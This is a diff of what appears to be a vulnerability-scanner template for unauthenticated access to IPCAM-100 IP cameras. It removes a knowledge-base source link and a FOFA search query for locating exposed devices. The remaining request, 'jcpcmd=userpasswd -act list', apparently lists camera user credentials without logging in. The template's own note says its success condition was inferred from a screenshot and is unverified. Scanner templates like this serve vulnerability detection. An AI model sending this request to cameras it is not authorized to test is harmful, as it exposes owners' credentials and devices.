@@ -3,14 +3,8 @@ info:
   name: IPCAM-100 存在未授权访问
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bd5yqnurzhrwmhy8
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bd5yqnurzhrwmhy8
-    fofa: body="laCurrentLanguage" && body="log_pwd"
 http:
 - raw:
   - 'GET /?jcpcmd=userpasswd%20-act%20list HTTP/1.1
